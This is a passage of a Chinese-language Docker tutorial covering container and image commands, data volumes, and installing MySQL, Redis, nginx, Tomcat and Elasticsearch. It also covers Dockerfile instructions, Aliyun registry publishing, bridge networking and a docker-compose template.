[OPTIONS] 容器id或容器名\t------------------ 查看容器日志\n-t\t\t\t 加入时间戳\n-f\t\t\t 跟随最新的日志打印\n--tail \t 数字\t显示最后多少条\n\n# 8.进入容器内部\ndocker exec [options] 容器id 容器内命令 ------------------ 进入容器执行命令\n-i\t\t以交互模式运行容器，通常与-t一起使用\n-t\t\t分配一个伪终端    shell窗口   bash \n\n# 9.容器和宿主机之间复制文件\ndocker cp 文件|目录 容器id:容器路径           -----------------   将宿主机复制到容器内部\ndocker cp 容器id:容器内资源路径 宿主机目录路径  -----------------   将容器内资源拷贝到主机上\n\n# 10.数据卷(volum)实现与宿主机共享目录\ndocker run -v 宿主机的路径|任意别名:/容器内的路径 镜像名\n注意: \n1.如果是宿主机路径必须是绝对路径,宿主机目录会覆盖容器内目录内容\n2.如果是别名则会在docker运行容器时自动在宿主机中创建一个目录,并将容器目录文件复制到宿主机中\n\n# 11.打包镜像\ndocker save 镜像名 -o  名称.tar\n\n# 12.载入镜像\ndocker load -i   名称.tar\n\n# 13.容器打包成新的镜像\ndocker commit -m "描述信息" -a "作者信息"   （容器id或者名称）打包的镜像名称:标签\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n# 新建并运行容器\n\ndocker run [OPTIONS] IMAGE [COMMAND] [ARG...]\noptions：\n--name="容器新名字": 为容器指定一个名称；\n-d: 后台运行容器，并返回容器ID，也即启动守护式容器；\n-i：以交互模式运行容器，通常与 -t 同时使用；\n-t：为容器重新分配一个伪输入终端，通常与 -i 同时使用；\n-P: 随机端口映射；\n-p: 指定端口映射，有以下四种格式\n      ip:hostPort:containerPort\n      ip::containerPort\n      **hostPort:containerPort**\n      containerPort\n\ne.g.\ndocker run --name centos_demo01 -t -i centos  # 交互式方式运行\ndocker run -d --name tomcat_demo01 -p 8081:8080 tomcat # 后台运行\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 查看容器\n\ndocker ps [options]\n\noptions:\n\t-a    查看所有容器包括正在运行和停止的\n\t-q    显示id\n  -n    显示最近创建的n个容器\n\t-l    显示最近创建的容器\n\t--no-stunc    不截断输出\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 退出容器的两种方式\n\nexit  # 容器停止\nCTRL+p+q\n\n\n1\n2\n\n\n# 容器的启动、停止、重启、强制关闭\n\ndocker start xxx \ndocker stop xxx\ndocker restart xxx\ndocker kill xxx\n\n\n1\n2\n3\n4\n\n\n# 删除容器\n\ndocker rm -f $(docker ps -aq) # 强制删除全部容器               = docker ps -qa |Xargs docker rm -f\n\n\n1\n\n\n# 查看容器日志\n\ndocker logs [options] 容器id\noptions：\n\t-t 时间戳\n\t-f 跟随最新日志\n\t--tail 数字后显示多少条\n\n\n1\n2\n3\n4\n5\n\n\n# 查看容器内进程\n\ndocker top 容器id\n\n\n1\n\n\n# 查看容器内部细节\n\ndocker inspect 容器id\n\n\n1\n\n\n# 重新进入正在运行的容器\n\ndocker exec -it 容器id /bin/bash  # 打开新的终端   新进程 以这种方式进入exit不会结束容器的运行\ndocker attach 容器id   # 直接进入容器启动的命令行终端\n\n\n1\n2\n\n\n# 文件相互拷贝\n\ndocker cp 容器id:容器路径 本机路径\ndocker cp 本机路径 容器id:容器内路径\n\n\n1\n2\n\n\n# 将容器保存为镜像\n\ndocker commit -p 容器名称 docker.io/zhangsan404/alpine:test_01\n\n\n1\n\n\n\n# 镜像\n\n\n# UnionFS - 联合文件系统\n\n> UnionFS（联合文件系统）：Union文件系统（UnionFS）是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directories into a single virtual filesystem)。Union 文件系统是 Docker 镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。\n\n\n# Docker镜像加载原理\n\ndocker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。\n\nbootfs(boot file system)主要包含bootloader和kernel, bootloader主要是引导加载kernel, Linux刚启动时会加载bootfs文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由bootfs转交给内核，此时系统也会卸载bootfs。\n\nrootfs (root file system) ，在bootfs之上。包含的就是典型 Linux 系统中的 /dev, /proc, /bin, /etc 等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。\n\n\n\n\n# Docker commit\n\n> Docker commit 可以将一个容器打包为镜像。\n\ndocker commit -m="描述信息" -a="作者" 容器id 镜像名称:tag\n\ne.g.\ndocker commit -m="tomcat with demo/helloworld" -a="jm" 0179893d97e7 jm/tomcat:1.2\n\n\n1\n2\n3\n4\n\n\n\n\n\n# 容器数据卷\n\n> Docker容器产生的数据，如果不通过docker commit生成新的镜像，使得数据做为镜像的一部分保存下来，那么当容器删除后，数据自然也就没有了。 为了能保存数据在docker中我们使用容器数据卷。\n\n卷就是目录或文件，存在于一个或多个容器中，由docker挂载到容器，但不属于联合文件系统，因此能够绕过Union File System提供一些用于持续存储或共享数据的特性。\n\n卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此Docker不会在容器删除时删除其挂载的数据卷\n\n特点：\n\n1：数据卷可在容器之间共享或重用数据 2：卷中的更改可以直接生效 3：数据卷中的更改不会包含在镜像的更新中 4：数据卷的生命周期一直持续到没有容器使用它为止\n\n\n# 命令行创建容器数据卷\n\n# 创建容器卷\n\n\tdocker run -ti --name demo01 -v ~/myfile:/opt:ro centos:latest # 带权限\n\n\n1\n\n\n# 查看容器卷挂载情况\n\ndocker inspect demo01  # 查看容器详细信息\n\n\n1\n\n\n\n\n\n# Dockerfile创建容器数据卷\n\n 1. 创建一个文件夹\n\nmkdir MyDockerfile\n\n\n1\n\n 2. 创建Dockerfile文件\n\nvim Dockerfile\n\nFROM centos   # 导入centos镜像\nVOLUME ["/dataVolumeContainer1","/dataVolumeContainer2"]  # 创建两个容器数据卷，由于主机的文件夹无法指定，这里的容器数据卷只有docker方向的\nCMD echo "finished,--------success1"\nCMD /bin/bash  # 执行bash\n\n\n1\n2\n3\n4\n5\n6\n\n 3. 构建容器\n\ndocker build -f dockerfile位置 -t 输出的镜像名称 . # 当前目录\n\ne.g.\ndocker build -f ~/MyDockerfile/Dockerfile -t jm/centos_jm:1.1 .\n\n\n1\n2\n3\n4\n\n\n\n\n默认主机端数据卷对接位置：\n\n\n\n\n# 数据卷容器\n\n> 命名的容器挂载数据卷，其它容器通过挂载这个(父容器)实现数据共享，挂载数据卷的容器，称之为数据卷容器\n\n创建父容器\n\ndocker run -ti --name dc01 jm/jm_centos:1.0\n\n\n1\n\n\n创建子容器\n\ndocker run -ti --name dc02 --volumes-from dc01 jm/jm_centos:1.0\n\n\n1\n\n\n子容器和父容器共享数据卷，当父容器删除时，子容器内容不会删除。可以理解为容器和数据卷分离，容器没了，数据卷还在。\n\n\n# Docker安装常见的服务\n\n\n# Docker 安装 Mysql\n\n# 1.拉取mysql镜像到本地\ndocker pull mysql:tag (tag不加默认最新版本)\n\n# 2.运行mysql服务\ndocker run --name mysql -e MYSQL_ROOT_PASSWORD=root -d mysql:tag  \t\t\t\t\t\t  --没有暴露外部端口外部不能连接\ndocker run --name mysql -e MYSQL_ROOT_PASSWORD=root -p 3306:3306 -d  mysql:tag  --没有暴露外部端口\n\n# 3.进入mysql容器\ndocker exec -it 容器名称|容器id bash\n\n# 4.外部查看mysql日志\ndocker logs 容器名称|容器id\n\n# 5.使用自定义配置参数\ndocker run --name mysql -v /root/mysql/conf.d:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=root -d mysql:tag\n\n# 6.将容器数据位置与宿主机位置挂载保证数据安全\ndocker run --name mysql -v /root/mysql/data:/var/lib/mysql -v /root/mysql/conf.d:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=root -p 3306:3306 -d mysql:tag\n\n# 7.通过其他客户端访问 如在window系统|macos系统使用客户端工具访问\n\n# 8.将mysql数据库备份为sql文件\ndocker exec mysql|容器id sh -c \'exec mysqldump --all-databases -uroot -p"$MYSQL_ROOT_PASSWORD"\' > /root/all-databases.sql  --导出全部数据\ndocker exec mysql sh -c \'exec mysqldump --databases 库表 -uroot -p"$MYSQL_ROOT_PASSWORD"\' > /root/all-databases.sql  --导出指定库数据\ndocker exec mysql sh -c \'exec mysqldump --no-data --databases 库表 -uroot -p"$MYSQL_ROOT_PASSWORD"\' > /root/all-databases.sql  --导出指定库数据不要数据\n\n# 9.执行sql文件到mysql中\ndocker exec -i mysql sh -c \'exec mysql -uroot -p"$MYSQL_ROOT_PASSWORD"\' < /root/xxx.sql\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# Docker安装Redis\n\n# 1.在docker hub搜索redis镜像\ndocker search redis\n\n# 2.拉取redis镜像到本地\ndocker pull redis\n\n# 3.启动redis服务运行容器\ndocker run --name redis -d redis:tag (没有暴露外部端口)\ndocker run --name redis -p 6379:6379 -d redis:tag (暴露外部宿主机端口为6379进行连接) \n\n# 4.查看启动日志\ndocker logs -t -f 容器id|容器名称\n\n# 5.进入容器内部查看\ndocker exec -it 容器id|名称 bash  \n\n# 6.加载外部自定义配置启动redis容器\n默认情况下redis官方镜像中没有redis.conf配置文件 需要去官网下载指定版本的配置文件\n1. wget http://download.redis.io/releases/redis-5.0.8.tar.gz  下载官方安装包\n2. 将官方安装包中配置文件进行复制到宿主机指定目录中如 /root/redis/redis.conf文件\n3. 修改需要自定义的配置\nbind 0.0.0.0 开启远程权限\nappenonly yes 开启aof持久化\n4. 加载配置启动\ndocker run --name redis -v /root/redis:/usr/local/etc/redis -p 6379:6379 -d redis redis-server /usr/local/etc/redis/redis.conf  \n\n# 7.将数据目录挂在到本地保证数据安全\ndocker run --name redis -v /root/redis/data:/data -v /root/redis/redis.conf:/usr/local/etc/redis/redis.conf -p 6379:6379 -d redis redis-server \t\t\t\t\t/usr/local/etc/redis/redis.conf  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# Docker 安装 nginx\n\n# 1.在docker hub搜索nginx\ndocker search nginx\n\n# 2.拉取nginx镜像到本地\n[root@localhost ~]# docker pull nginx\nUsing default tag: latest\nlatest: Pulling from library/nginx\nafb6ec6fdc1c: Pull complete \nb90c53a0b692: Pull complete \n11fa52a0fdc0: Pull complete \nDigest: sha256:30dfa439718a17baafefadf16c5e7c9d0a1cde97b4fd84f63b69e13513be7097\nStatus: Downloaded newer image for nginx:latest\ndocker.io/library/nginx:latest\n\n# 3.启动nginx容器\ndocker run -p 80:80 --name nginx01 -d nginx\n\n# 4.进入容器\ndocker exec -it nginx01 /bin/bash\n查找目录:  whereis nginx\n配置文件:  /etc/nginx/nginx.conf\n\n# 5.复制配置文件到宿主机\ndocker cp nginx01(容器id|容器名称):/etc/nginx/nginx.conf 宿主机名录\n\n# 6.挂在nginx配置以及html到宿主机外部\ndocker run --name nginx02 -v /root/nginx/nginx.conf:/etc/nginx/nginx.conf -v /root/nginx/html:/usr/share/nginx/html -p 80:80 -d nginx\t\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# Docker 安装 Tomcat\n\n# 1.在docker hub搜索tomcat\ndocker search tomcat\n\n# 2.下载tomcat镜像\ndocker pull tomcat\n\n# 3.运行tomcat镜像\ndocker run -p 8080:8080 -d --name mytomcat tomcat\n\n# 4.进入tomcat容器\ndocker exec -it mytomcat /bin/bash\n\n# 5.将webapps目录挂载在外部\ndocker run -p 8080:8080 -v /root/webapps:/usr/local/tomcat/webapps -d --name mytomcat tomcat\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# Docker 安装 ES\n\n# 0. 拉取镜像 启动容器\n\n# 1.dockerhub 拉取镜像\n\tdocker pull elasticsearch:6.4.2\n# 2.查看docker镜像\n\tdocker images\n# 3.运行docker镜像\n\tdocker run -p 9200:9200 -p 9300:9300 elasticsearch:6.4.2\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n\n# 1. 进行相关的配置\n\n# 1.在centos虚拟机中，修改配置sysctl.conf\n\tvim /etc/sysctl.conf\n# 2.加入如下配置\n\tvm.max_map_count=262144 \n# 3.启用配置\n\tsysctl -p\n\t注：这一步是为了防止启动容器时，报出如下错误：\n\tbootstrap checks failed max virtual memory areas vm.max_map_count [65530] likely too low, increase to at least [262144]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 2. 启动容器\n\n# 0.复制容器中data目录到宿主机中\ndocker cp 容器id:/usr/share/share/elasticsearch/data /root/es\n# 1.运行ES容器 指定jvm内存大小并指定ik分词器位置\ndocker run -d --name es -p 9200:9200 -p 9300:9300 -e ES_JAVA_OPTS="-Xms128m -Xmx128m" -v /root/es/plugins:/usr/share/elasticsearch/plugins -v /root/es/data:/usr/share/elasticsearch/data elasticsearch:6.4.2\n\n\n1\n2\n3\n4\n\n\n# 3.安装IK分词器\n\n# 1.下载对应版本的IK分词器\nwget https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v6.4.2/elasticsearch-analysis-ik-6.4.2.zip\n\n# 2.解压到plugins文件夹中\nyum install -y unzip\nunzip -d ik elasticsearch-analysis-ik-6.4.2.zip\n\n# 3.添加自定义扩展词和停用词\ncd plugins/elasticsearch/config\nvim IKAnalyzer.cfg.xml\n<properties>\n<comment>IK Analyzer 扩展配置</comment>\n\x3c!--用户可以在这里配置自己的扩展字典 --\x3e\n<entry key="ext_dict">ext_dict.dic</entry>\n\x3c!--用户可以在这里配置自己的扩展停止词字典--\x3e\n<entry key="ext_stopwords">ext_stopwords.dic</entry>\n</properties>\n\n# 4.在ik分词器目录下config目录中创建ext_dict.dic文件   编码一定要为UTF-8才能生效\nvim ext_dict.dic 加入扩展词即可\n# 5. 在ik分词器目录下config目录中创建ext_stopword.dic文件 \nvim ext_stopwords.dic 加入停用词即可\n\n# 6.重启容器生效\ndocker restart 容器id\n# 7.将此容器提交成为一个新的镜像\ndocker commit -a="xiaochen" -m="es with IKAnalyzer" 容器id xiaochen/elasticsearch:6.4.2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n# 4. 安装Kibana\n\n# 1.下载kibana镜像到本地\ndocker pull kibana:6.4.2\n\n# 2.启动kibana容器\ndocker run -d --name kibana -e ELASTICSEARCH_URL=http://10.15.0.3:9200 -p 5601:5601 kibana:6.4.2\n\n\n1\n2\n3\n4\n5\n\n\n\n# Docker 常见问题处置\n\n[root@localhost ~]# docker search mysql 或者 docker pull 这些命令无法使用\nError response from daemon: Get https://index.docker.io/v1/search?q=mysql&n=25: x509: certificate has expired or is not yet valid\n\n\n1\n2\n\n\n\n\n注意:这个错误的原因在于是系统的时间和docker hub时间不一致,需要做系统时间与网络时间同步\n\n# 1.安装时间同步\n\tsudo yum -y install ntp ntpdate\n# 2.同步时间\n\tsudo ntpdate cn.pool.ntp.org\n# 3.查看本机时间\n\tdate\n# 4.从新测试\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# Dockerfile\n\n> Dockerfile是用来构建Docker镜像的构建文件，是由一系列命令和参数构成的脚本。\n\n\n# 什么是Dockerfile\n\nDockerfile可以认为是Docker镜像的描述文件，是由一系列命令和参数构成的脚本。主要作用是用来构建docker镜像的构建文件。\n\n\n\n * 通过架构图可以看出通过DockerFile可以直接构建镜像\n\n\n# Dockerfile解析过程\n\n\n\n\n# Dockerfile的保留命令\n\n官方说明:https://docs.docker.com/engine/reference/builder/\n\n保留字          作用\nFROM         当前镜像是基于哪个镜像的 第一个指令必须是FROM\nMAINTAINER   镜像维护者的姓名和邮箱地址\nRUN          构建镜像时需要运行的指令\nEXPOSE       当前容器对外暴露出的端口号\nWORKDIR      指定在创建容器后，终端默认登录进来的工作目录，一个落脚点\nENV          用来在构建镜像过程中设置环境变量\nADD          将宿主机目录下的文件拷贝进镜像且ADD命令会自动处理URL和解压tar包\nCOPY         类似于ADD，拷贝文件和目录到镜像中\n             将从构建上下文目录中<原路径>的文件/目录复制到新的一层的镜像内的<目标路径>位置\nVOLUME       容器数据卷，用于数据保存和持久化工作\nCMD          指定一个容器启动时要运行的命令\n             Dockerfile中可以有多个CMD指令，但只有最后一个生效，CMD会被docker run之后的参数替换\nENTRYPOINT   指定一个容器启动时要运行的命令\n             ENTRYPOINT的目的和CMD一样，都是在指定容器启动程序及其参数\n\n# FROM\n\n * 基于那个镜像进行构建新的镜像,在构建时会自动从docker hub拉取base镜像 必须作为Dockerfile的第一个指令出现\n\n * 语法:\n   \n   FROM  <image>\n   FROM  <image>[:<tag>]     使用版本不写为latest\n   FROM  <image>[@<digest>]  使用摘要\n   \n   \n   1\n   2\n   3\n   \n\n# MAINTAINER\n\n * 镜像维护者的姓名和邮箱地址[废弃]\n\n * 语法:\n   \n   MAINTAINER <name>\n   \n   \n   1\n   \n\n# RUN\n\n * RUN指令将在当前映像之上的新层中执行任何命令并提交结果。生成的提交映像将用于Dockerfile中的下一步\n\n * 语法:\n   \n   RUN <command> (shell form, the command is run in a shell, which by default is /bin/sh -c on Linux or cmd /S /C on Windows)\n   RUN echo hello\n   \n   RUN ["executable", "param1", "param2"] (exec form)\n   RUN ["/bin/bash", "-c", "echo hello"]\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n# EXPOSE\n\n * 用来指定构建的镜像在运行为容器时对外暴露的端口\n\n * 语法:\n   \n   EXPOSE 80/tcp  如果没有显示指定则默认暴露都是tcp\n   EXPOSE 80/udp\n   \n   \n   1\n   2\n   \n\n# CMD\n\n * 用来为启动的容器指定执行的命令,在Dockerfile中只能有一条CMD指令。如果列出多个命令，则只有最后一个命令才会生效。\n\n * 注意: Dockerfile中只能有一条CMD指令。如果列出多个命令，则只有最后一个命令才会生效。\n\n * 语法:\n   \n   CMD ["executable","param1","param2"] (exec form, this is the preferred form)\n   CMD ["param1","param2"] (as default parameters to ENTRYPOINT)\n   CMD command param1 param2 (shell form)\n   \n   \n   1\n   2\n   3\n   \n\n# WORKDIR\n\n * 用来为Dockerfile中的任何RUN、CMD、ENTRYPOINT、COPY和ADD指令设置工作目录。如果WORKDIR不存在，即使它没有在任何后续Dockerfile指令中使用，它也将被创建。\n\n * 语法:\n   \n   WORKDIR /path/to/workdir\n   \n   WORKDIR /a\n   WORKDIR b\n   WORKDIR c\n   `注意:WORKDIR指令可以在Dockerfile中多次使用。如果提供了相对路径，则该路径将与先前WORKDIR指令的路径相对`\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n# ENV\n\n * 用来为构建镜像设置环境变量。这个值将出现在构建阶段中所有后续指令的环境中。\n\n * 语法：\n   \n   ENV <key> <value>\n   ENV <key>=<value> ...\n   \n   \n   1\n   2\n   \n\n# ADD\n\n * 用来从context上下文复制新文件、目录或远程文件url，并将它们添加到位于指定路径的映像文件系统中。\n\n * 语法:\n   \n   ADD hom* /mydir/       通配符添加多个文件\n   ADD hom?.txt /mydir/   通配符添加\n   ADD test.txt relativeDir/  可以指定相对路径\n   ADD test.txt /absoluteDir/ 也可以指定绝对路径\n   ADD url \n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n# COPY\n\n * 用来将context目录中指定文件复制到镜像的指定目录中\n\n * 语法:\n   \n   COPY src dest\n   COPY ["<src>",... "<dest>"]\n   \n   \n   1\n   2\n   \n\n# VOLUME\n\n * 用来定义容器运行时可以挂在到宿主机的目录\n\n * 语法:\n   \n   VOLUME ["/data"]\n   \n   \n   1\n   \n\n# ENTRYPOINT\n\n * 用来指定容器启动时执行命令和CMD类似\n\n * 语法:\n   \n     ["executable", "param1", "param2"]\n   ENTRYPOINT command param1 param2\n   \n   \n   1\n   2\n   \n   \n   ENTRYPOINT指令，往往用于设置容器启动后的第一个命令，这对一个容器来说往往是固定的。 CMD指令，往往用于设置容器启动的第一个命令的默认参数，这对一个容器来说可以是变化的。\n\n# ONBUILD\n\n触发器，当构建一个被继承的Dockerfile时运行的命令，父镜像在被子镜像集成之后，onbuild被触发\n\n\n\n\n# Dockerfile 打包 Springboot项目\n\n# 0. 打包本地项目\n\n\n\n# 1. 将可运行项目放入linux虚拟机中\n\n\n\n# 3. 编写dockerFile\n\nFROM openjdk:8\nWORKDIR /ems\nADD ems.jar /ems\nEXPOSE 8989\nENTRYPOINT ["java","-jar"]\nCMD ["ems.jar"]\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 4. 构建运行\n\n[root@localhost ems]# docker build -t ems .\n[root@localhost ems]# docker run -p 8989:8989 ems\n\n\n1\n2\n\n\n\n# 本地镜像发布\n\n<https://cr.console.aliyun.com/cn-beijing/instance/repositories>\n\n\n1\n\n\n\n\n1. 登录阿里云Docker Registry $ sudo docker login --username=153****2135 registry.cn-beijing.aliyuncs.com\n\n用于登录的用户名为阿里云账号全名，密码为开通服务时设置的密码。 您可以在访问凭证页面修改凭证密码。\n\n\n# 2. 从Registry中拉取镜像\n\n$ sudo docker pull registry.cn-beijing.aliyuncs.com/csbugless/test:[镜像版本号]\n\n\n1\n\n\n\n# 3. 将镜像推送到Registry\n\n$ sudo docker login --username=153****2135 registry.cn-beijing.aliyuncs.com\n$ sudo docker tag [ImageId] registry.cn-beijing.aliyuncs.com/csbugless/test:[镜像版本号]\n$ sudo docker push registry.cn-beijing.aliyuncs.com/csbugless/test:[镜像版本号]\n\n\n1\n2\n3\n\n\n请根据实际镜像信息替换示例中的[ImageId]和[镜像版本号]参数。\n\n\n# 4. 选择合适的镜像仓库地址\n\n从ECS推送镜像时，可以选择使用镜像仓库内网地址。推送速度将得到提升并且将不会损耗您的公网流量。\n\n如果您使用的机器位于VPC网络，请使用 registry-vpc.cn-beijing.aliyuncs.com 作为Registry的域名登录。\n\n\n# 5. 示例\n\n使用"docker tag"命令重命名镜像，并将它通过专有网络地址推送至Registry。\n\n$ sudo docker imagesREPOSITORY                                                         TAG                 IMAGE ID            CREATED             VIRTUAL SIZEregistry.aliyuncs.com/acs/agent                                    0.7-dfb6816         37bb9c63c8b2        7 days ago          37.89 MB$ sudo docker tag 37bb9c63c8b2 registry-vpc.cn-beijing.aliyuncs.com/acs/agent:0.7-dfb6816\n\n\n1\n\n\n使用 "docker push" 命令将该镜像推送至远程。\n\n$ sudo docker push registry-vpc.cn-beijing.aliyuncs.com/acs/agent:0.7-dfb6816\n\n\n1\n\n\n\n# 高级网络和容器卷\n\n\n# 高级网络配置\n\n# 说明\n\n当 Docker 启动时，会自动在主机上创建一个 docker0 虚拟网桥，实际上是 Linux 的一个 bridge，可以理解为一个软件交换机。它会在挂载到它的网口之间进行转发。\n\n同时，Docker 随机分配一个本地未占用的私有网段（在 RFC1918 中定义）中的一个地址给 docker0 接口。比如典型的 172.17.42.1，掩码为 255.255.0.0。此后启动的容器内的网口也会自动分配一个同一网段（172.17.0.0/16）的地址。\n\n当创建一个 Docker 容器的时候，同时会创建了一对 veth pair 接口（当数据包发送到一个接口时，另外一个接口也可以收到相同的数据包）。这对接口一端在容器内，即 eth0；另一端在本地并被挂载到 docker0 网桥，名称以 veth 开头（例如 vethAQI2QT）。通过这种方式，主机可以跟容器通信，容器之间也可以相互通信。Docker 就创建了在主机和所有容器之间一个虚拟共享网络。\n\n\n\n# 查看网络信息\n\n# docker network ls\n\n\n1\n\n\n# 创建一个网桥\n\n# docker network create -d bridge 网桥名称\n\n\n1\n\n\n# 删除一个网桥\n\n# docker network rm 网桥名称\n\n\n1\n\n\n# 容器之前使用网络通信\n\n# 1.查询当前网络配置\n- docker network ls\nNETWORK ID          NAME                DRIVER              SCOPE\n8e424e5936b7        bridge              bridge              local\n17d974db02da        docker_gwbridge     bridge              local\nd6c326e433f7        host                host                local\n# 2.创建桥接网络\n- docker network create -d bridge info\n[root@centos ~]# docker network create -d bridge info\n6e4aaebff79b1df43a064e0e8fdab08f52d64ce34db78dd5184ce7aaaf550a2f\n[root@centos ~]# docker network ls\nNETWORK ID          NAME                DRIVER              SCOPE\n8e424e5936b7        bridge              bridge              local\n17d974db02da        docker_gwbridge     bridge              local\nd6c326e433f7        host                host                local\n6e4aaebff79b        info                bridge              local\n# 3.启动容器指定使用网桥\n- docker run -d -p 8890:80 --name nginx001 --network info nginx \n- docker run -d -p 8891:80 --name nginx002 --network info nginx \n注意:一旦指定网桥后--name指定名字就是主机名,多个容器指定在同一个网桥时,可以在任意一个容器中使用主机名与容器进行互通\n[root@centos ~]# docker run -d -p 8890:80 --name nginx001 --network info nginx \nc315bcc94e9ddaa36eb6c6f16ca51592b1ac8bf1ecfe9d8f01d892f3f10825fe\n[root@centos ~]# docker run -d -p 8891:80 --name nginx002 --network info nginx\nf8682db35dd7fb4395f90edb38df7cad71bbfaba71b6a4c6e2a3a525cb73c2a5\n[root@centos ~]# docker ps\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES\nf8682db35dd7        nginx               "/docker-entrypoint.…"   3 seconds ago       Up 2 seconds        0.0.0.0:8891->80/tcp   nginx002\nc315bcc94e9d        nginx               "/docker-entrypoint.…"   7 minutes ago       Up 7 minutes        0.0.0.0:8890->80/tcp   nginx001\nb63169d43792        mysql:5.7.19        "docker-entrypoint.s…"   7 minutes ago       Up 7 minutes        3306/tcp               mysql_mysql.1.s75qe5kkpwwttyf0wrjvd2cda\n[root@centos ~]# docker exec -it f8682db35dd7 /bin/bash\nroot@f8682db35dd7:/# curl http://nginx001\n<!DOCTYPE html>\n<html>\n<head>\n<title>Welcome to nginx!</title>\n.....\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# 高级数据卷配置\n\n# 说明\n\n数据卷 是一个可供一个或多个容器使用的特殊目录，它绕过 UFS，可以提供很多有用的特性：\n\n * 数据卷 可以在容器之间共享和重用\n * 对 数据卷 的修改会立马生效\n * 对 数据卷 的更新，不会影响镜像\n * 数据卷 默认会一直存在，即使容器被删除\n\n> 注意：数据卷 的使用，类似于 Linux 下对目录或文件进行 mount，镜像中的被指定为挂载点的目录中的文件会复制到数据卷中（仅数据卷为空时会复制）。\n\n# 创建数据卷\n\n[root@centos ~]# docker volume create my-vol\nmy-vol\n\n\n1\n2\n\n\n# 查看数据卷\n\n[root@centos ~]# docker volume inspect my-vol       \n[\n    {\n        "CreatedAt": "2020-11-25T11:43:56+08:00",\n        "Driver": "local",\n        "Labels": {},\n        "Mountpoint": "/var/lib/docker/volumes/my-vol/_data",\n        "Name": "my-vol",\n        "Options": {},\n        "Scope": "local"\n    }\n]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 挂载数据卷\n\n[root@centos ~]# docker run -d -P --name web  -v my-vol:/usr/share/nginx/html  nginx\n[root@centos ~]# docker inspect web\n\t\t\t\t"Mounts": [\n            {\n                "Type": "volume",\n                "Name": "my-vol",\n                "Source": "/var/lib/docker/volumes/my-vol/_data",\n                "Destination": "/usr/share/nginx/html",\n                "Driver": "local",\n                "Mode": "z",\n                "RW": true,\n                "Propagation": ""\n            }\n        ],\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 删除数据卷\n\ndocker volume rm my-vol\n\n\n1\n\n\n\n# Docker compose\n\n\n# docker compose使用\n\n# 1.相关概念\n\n首先介绍几个术语。\n\n * 服务 (service)：一个应用容器，实际上可以运行多个相同镜像的实例。\n * 项目 (project)：由一组关联的应用容器组成的一个完整业务单元。∂一个项目可以由多个服务（容器）关联而成，Compose 面向项目进行管理。\n\n# 2.场景\n\n最常见的项目是 web 网站，该项目应该包含 web 应用和缓存。\n\n * springboot应用\n * mysql服务\n * redis服务\n * elasticsearch服务\n * .......\n\n# 3.docker-compose模板\n\n * 参考文档:https://docker_practice.gitee.io/zh-cn/compose/compose_file.html\n\nversion: "3.0"\nservices:\n  mysqldb:\n    image: mysql:5.7.19\n    container_name: mysql\n    ports:\n      - "3306:3306"\n    volumes:\n      - /root/mysql/conf:/etc/mysql/conf.d\n      - /root/mysql/logs:/logs\n      - /root/mysql/data:/var/lib/mysql\n    environment:\n      MYSQL_ROOT_PASSWORD: root\n    networks:\n      - ems\n    depends_on:\n      - redis\n\n  redis:\n    image: redis:4.0.14\n    container_name: redis\n    ports:\n      - "6379:6379"\n    networks:\n      - ems\n    volumes:\n      - /root/redis/data:/data\n    command: redis-server\n    \nnetworks:\n  ems:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# 4.通过docker-compose运行一组容器\n\n * 参考文档:https://docker_practice.gitee.io/zh-cn/compose/commands.html\n\n[root@centos ~]# docker-compose up    